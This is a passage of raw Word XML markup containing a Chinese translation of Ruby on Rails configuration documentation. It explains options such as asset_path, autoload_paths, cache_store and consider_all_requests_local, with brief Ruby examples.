          <w:p w14:paraId="30BE89F0"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config.after_initialize do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="18BE7A28"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ActionView::Base.sanitized_allowed_tags.delete 'div'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E610C53"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end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="67FC164E" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11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config.allow_concurrency</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 应该设置为 true 来处理同时运行(线程安全)的活动. False 为默认值. 你也许不会想要直接调用它, 那是因为要做一系列其它的调整来让线程安全模式良好的运行.也可以通过</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>threadsafe!</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>来激活.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CF0A625" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="114"/>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config.asset_host</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 用于设置资源主机. 当CDNs被使用于自己的资源主机,或者当你想用不同的域名别名来解决浏览器内建线程并发限制时会很有用.这是</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.action_controller.asset_host</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的简短版本</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4722C44A" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11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config.asset_path</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 让你布置资源的路径.可以是一个可调用的对象, 一个字符串,或者是默认值</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. 例如, 通常</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>blog.js</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的路径会是 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/javascript/blog.js</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, 假设其绝对路径为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>path</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. 如果 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.asset_path</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 可调用, Rails 在生成资源路径的时候调用它,并向它投递</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>path</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">参数. 如果 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.asset_path</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 是个字符串, 它应该是个带有 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>%s</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>sprintf</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 格式的字符串, </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>path</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 会插入到 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>%s</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的位置. 在任何情况下, Rails 输出布置好的路径. 这是 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.action_controller.asset_path</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>简短版本.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6840"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="41975D96" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1BD12579" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1987204860"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.asset_path = proc { |path| "/blog/public#{path}"</w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="66EE1A08"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如果开启了 asset pipeline, </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.asset_path</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 配置会被忽略. 默认是开启 asset pipeline.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57699D3D" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11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config.autoload_once_paths</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 接受一个路径数组, Rails将会自动加载这些路径中的常量,所以这些常量就不会在每次请求时都被清除. 如果</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.cache_classes</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">是 false , 这个配置将会无效, 这在开发环境下是默认的. 另外, 所有的自动加载都是发生一次. 数组里的所有元素必须同时在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>autoload_paths</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里。这默认是空数组.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09C2226D" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11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config.autoload_paths</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 接受一个路径数组, Rails将会自动加载这些路径着哦国内的常量. 默认是</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>目录下的所有目录.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77AF6D56" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="118"/>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config.action_view.cache_template_loading</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 控制模板是否每个请求都要重新加载. 默认是 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.cache_classes</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置的任何值.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20026FDC" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="119"/>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config.cache_store</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 配置Rails缓存要使用什么缓存存储. 可选 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:memory_store</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:file_store</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:mem_cache_store</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 其中一个, 有或者是实现了缓存API的一个对象.如果目录 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>tmp/cache</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 存在则默认是 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:file_store</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, 否则是 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:memory_store</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="188A08E4" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="120"/>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config.colorize_logging</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指定记录日志信息是否使用ANSI颜色码.默认是 true.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0283CEA0" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12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config.consider_all_requests_local</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 是个标记. 如果为 true 则任何携带详细调试信息的错误信息都会被添加到 HTTP 回应(response) 里, 并且 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails::Info</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 控制器会显示应用运行时上下文到 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/rails/info/properties</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. 在开发和测试模式默认是 true , 在生产模式是 false. 为了更细致的控制, 将其设置为 false 并在控制器里实现</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>local_request?</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>来指定哪些请求的错误信息需要提供调式信息.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="159A81A8" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12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config.dependency_loading</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 是个标志. 将其设置为 false 可以使自动加载常量失效. 它只在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.cache_classes</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为 true 的时候才有效, 这在生产模式是默认的. 这个标志会被 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
